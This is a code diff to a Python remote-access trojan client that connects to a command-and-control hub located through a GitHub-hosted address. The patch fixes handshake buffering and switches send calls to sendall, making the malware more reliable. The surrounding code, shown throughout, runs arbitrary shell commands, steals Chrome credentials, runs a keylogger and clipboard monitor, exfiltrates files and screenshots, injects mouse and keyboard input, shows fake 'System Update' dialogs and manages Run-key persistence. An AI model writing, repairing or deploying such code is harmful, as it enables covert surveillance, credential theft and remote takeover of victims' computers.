@@ -338,14 +338,13 @@ def capture_desktop_screenshot(client, is_websocket=False):
             jpg_data = buffer.getvalue()
             send_atomic_data(client, 'SCREENSHOT', jpg_data, 'screenshot.jpg', is_websocket=is_websocket)
     except Exception as e:
-        try:
-            if is_websocket:
-                client.send(f'CAPTURE_FAILED: {e}')
-            else:
-                client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
-        except Exception:
-            pass
-
+            try:
+                if is_websocket:
+                    client.send(f'CAPTURE_FAILED: {e}')
+                else:
+                    client.sendall(f'CAPTURE_FAILED: {e}'.encode('utf-8'))
+            except Exception:
+                pass
 
 # Persistence
 
@@ -991,6 +990,7 @@ def perform_persistent_handshake(sock, hwid, user, location, version):
     handshake_message = f"NODE_DATA|{hwid}|{user}|{location}|{version}|END_HANDSHAKE\n"
     sock.setblocking(False)
     last_send = 0
+    buffer = b''
 
     while True:
         current_time = time.time()
@@ -1010,9 +1010,11 @@ def perform_persistent_handshake(sock, hwid, user, location, version):
             if ack_bytes == b'':
                 raise ConnectionError("Connection closed before KING_ACK")
 
-            ack_data = ack_bytes.decode('utf-8', errors='ignore')
-            if "KING_ACK" in ack_data:
+            buffer += ack_bytes
+            if b"KING_ACK" in buffer:
                 print("[+] KING_ACK received! Handshake complete.")
+                ack_index = buffer.index(b"KING_ACK") + len(b"KING_ACK")
+                remaining = buffer[ack_index:]
                 break
         except BlockingIOError:
             pass
@@ -1025,6 +1027,7 @@ def perform_persistent_handshake(sock, hwid, user, location, version):
 
     sock.setblocking(True)
     sock.settimeout(15)
+    return remaining
 
 
 def connect_to_king(king_url):
@@ -1053,10 +1056,10 @@ def connect_to_king(king_url):
             version = get_current_version()
             hwid = get_hwid()
 
-            perform_persistent_handshake(s, hwid, user, location, version)
+            leftover = perform_persistent_handshake(s, hwid, user, location, version)
 
             print("[+] Connection Established - Ready for commands!")
-            return s
+            return s, leftover
 
         except Exception as e:
             try:
@@ -1081,10 +1084,10 @@ def connect_direct_hub(hub_ip, port, max_retries: int = 3):
             version = get_current_version()
             hwid = get_hwid()
 
-            perform_persistent_handshake(s, hwid, user, location, version)
+            leftover = perform_persistent_handshake(s, hwid, user, location, version)
 
             print(f"[+] Direct TCP connection established to hub at {hub_ip}:{port} with HWID")
-            return s
+            return s, leftover
         except Exception as e:
             try:
                 s.close()
@@ -1095,7 +1098,7 @@ def connect_direct_hub(hub_ip, port, max_retries: int = 3):
                 time.sleep(1)
                 continue
             print(f"[-] Direct TCP connection failed after {max_retries} attempts")
-            return None
+            return None, b''
 
 
 def send_heartbeat(sock):
@@ -1103,7 +1106,7 @@ def send_heartbeat(sock):
     while True:
         time.sleep(15)
         try:
-            sock.send(b'PING\n')
+            sock.sendall(b'PING\n')
         except Exception:
             break
 
@@ -1119,13 +1122,13 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                 print(f"[*] Fetching hub address from throne: {github_throne_url}")
                 king_url = get_king_url(github_throne_url)
                 if king_url:
-                    client = connect_to_king(king_url)
+                    client, buffer = connect_to_king(king_url)
                 else:
                     print(f"[-] Failed to get throne URL, trying direct connection to {hub_ip}:{port}")
-                    client = connect_direct_hub(hub_ip, port) if hub_ip else None
+                    client, buffer = connect_direct_hub(hub_ip, port) if hub_ip else (None, b'')
             else:
                 print(f"[*] Connecting directly to hub at {hub_ip}:{port}")
-                client = connect_direct_hub(hub_ip, port) if hub_ip else None
+                client, buffer = connect_direct_hub(hub_ip, port) if hub_ip else (None, b'')
 
             if not client:
                 delay = random.randint(5, 15)
@@ -1139,8 +1142,12 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
 
             while True:
                 try:
-                    # Always use raw socket recv for TCP connection
-                    data = client.recv(1024)
+                    # Use any buffered handshake remainder first
+                    if buffer:
+                        data = buffer
+                        buffer = b''
+                    else:
+                        data = client.recv(1024)
 
                     if isinstance(data, bytes):
                         data = data.decode('utf-8', errors='ignore')
@@ -1164,10 +1171,10 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                         continue
 
                     elif command == 'STATUS_REPORT':
-                        client.send(f'STATUS:{report_status()}\n'.encode())
+                        client.sendall(f'STATUS:{report_status()}\n'.encode())
                     elif command == 'TRIGGER_EVOLVE':
                         check_for_updates()
-                        client.send(b'EVOLVE_CHECKED\nV_PULSE_EOF\n')
+                        client.sendall(b'EVOLVE_CHECKED\nV_PULSE_EOF\n')
                     elif command == 'DESKTOP_CAPTURE':
                         capture_desktop_screenshot(client, is_websocket=False)
                     elif command == 'SCREENSHOT':
@@ -1183,20 +1190,20 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
 
                             # Send THE HEADER: Type|Size|Name
                             header = f"DATA_HEADER|SCREENSHOT|{len(img_data)}|snap_{int(time.time())}.png\n"
-                            client.send(header.encode() + img_data + b"V_PULSE_EOF")
+                            client.sendall(header.encode() + img_data + b"V_PULSE_EOF")
 
                             # Clean up
                             os.remove(temp_img)
                         except Exception as e:
-                            client.send(f"DATA_HEADER|LOG|{len(str(e))}|error.txt\n{str(e)}V_PULSE_EOF".encode())
+                            client.sendall(f"DATA_HEADER|LOG|{len(str(e))}|error.txt\n{str(e)}V_PULSE_EOF".encode())
                     elif command == 'ENSURE_SERVICE_CONTINUITY':
                         ensure_service_continuity()
-                        client.send(b'SERVICE_CONTINUITY_OK\nV_PULSE_EOF\n')
+                        client.sendall(b'SERVICE_CONTINUITY_OK\nV_PULSE_EOF\n')
                     elif command == 'SHUTDOWN_NODE':
                         print('[*] Shutdown command received.')
                         return
                     elif command == 'PING':
-                        client.send(b'PING_OK\nV_PULSE_EOF\n')
+                        client.sendall(b'PING_OK\nV_PULSE_EOF\n')
                     elif command.startswith('MESSAGE '):
                         # Syntax: MESSAGE "text"
                         try:
@@ -1205,7 +1212,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             ctypes.windll.user32.MessageBoxW(0, msg_text, 'System Update', 64)
                         except:
                             pass
-                        client.send(b'V_PULSE_EOF\n')
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command.startswith('SHELL '):
                         # Syntax: SHELL "cmd"
                         try:
@@ -1214,7 +1221,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             subprocess.Popen(cmd_text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         except:
                             pass
-                        client.send(b'V_PULSE_EOF\n')
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command.startswith('GHOST_OPEN|') or command.startswith('open '):
                         try:
                             if command.startswith('GHOST_OPEN|'):
@@ -1225,27 +1232,27 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             webbrowser.open(target_url)
                         except:
                             pass
-                        client.send(b'V_PULSE_EOF\n')
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command == 'GHOST_MOVE':
                         if not PYAUTOGUI_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
+                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                         else:
                             try:
                                 pyautogui.moveRel(10, 0, duration=0.1)
                                 pyautogui.moveRel(-10, 0, duration=0.1)
                             except Exception:
                                 pass
-                        client.send(b'V_PULSE_EOF\n')
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command.startswith('GHOST_TYPE|'):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
+                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                         else:
                             try:
                                 text = command.split('|', 1)[1]
                                 pyautogui.typewrite(text)
                             except Exception:
                                 pass
-                        client.send(b'V_PULSE_EOF\n')
+                        client.sendall(b'V_PULSE_EOF\n')
                     elif command == 'KILL_AGENT':
                         try:
                             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
@@ -1277,7 +1284,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                         send_atomic_data(client, 'CREDENTIALS', extract_chrome_credentials(), 'chrome_credentials.txt', is_websocket=False)
                     elif command == 'GET_KEYS':
                         if not PYNPUT_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
+                            client.sendall(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
                         else:
                             send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=False)
                     elif command.startswith('EXTRACT_FILE '):
@@ -1289,25 +1296,25 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             send_atomic_data(client, 'FILE', payload, os.path.basename(file_path), is_websocket=False)
                     elif command.startswith('KEYLOG'):
                         if not PYNPUT_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
+                            client.sendall(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
                         elif 'START' in command.upper():
-                            client.send(f'KEYLOG_RESULT: {start_keylogger()}\nV_PULSE_EOF\n'.encode('utf-8'))
+                            client.sendall(f'KEYLOG_RESULT: {start_keylogger()}\nV_PULSE_EOF\n'.encode('utf-8'))
                         elif 'STOP' in command.upper():
-                            client.send(f'KEYLOG_RESULT: {stop_keylogger()}\nV_PULSE_EOF\n'.encode('utf-8'))
+                            client.sendall(f'KEYLOG_RESULT: {stop_keylogger()}\nV_PULSE_EOF\n'.encode('utf-8'))
                         else:
-                            client.send(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\nV_PULSE_EOF\n')
+                            client.sendall(b'KEYLOG_RESULT: Use KEYLOG START or KEYLOG STOP\nV_PULSE_EOF\n')
                     elif command.startswith('CLIPBOARD'):
                         if not PYPERCLIP_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyperclip\nV_PULSE_EOF\n')
+                            client.sendall(b'DEPENDENCY_MISSING: pyperclip\nV_PULSE_EOF\n')
                         elif 'START' in command.upper():
-                            client.send(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\nV_PULSE_EOF\n'.encode('utf-8'))
+                            client.sendall(f'CLIPBOARD_RESULT: {start_clipboard_monitor()}\nV_PULSE_EOF\n'.encode('utf-8'))
                         elif 'STOP' in command.upper():
-                            client.send(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\nV_PULSE_EOF\n'.encode('utf-8'))
+                            client.sendall(f'CLIPBOARD_RESULT: {stop_clipboard_monitor()}\nV_PULSE_EOF\n'.encode('utf-8'))
                         else:
-                            client.send(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\nV_PULSE_EOF\n')
+                            client.sendall(b'CLIPBOARD_RESULT: Use CLIPBOARD START or CLIPBOARD STOP\nV_PULSE_EOF\n')
                     elif command.startswith('CLICK '):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
+                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                         else:
                             try:
                                 parts = command.split()
@@ -1318,7 +1325,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                                 pass
                     elif command.startswith('TYPE '):
                         if not PYAUTOGUI_AVAILABLE:
-                            client.send(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
+                            client.sendall(b'DEPENDENCY_MISSING: pyautogui\nV_PULSE_EOF\n')
                         else:
                             try:
                                 text = command[5:].strip('"')
@@ -1420,4 +1427,5 @@ if __name__ == '__main__':
     threading.Thread(target=auto_update_monitor, daemon=True).start()
 
     main_loop(args.hub_ip, args.hub_port, args.github_throne_url)
+
 
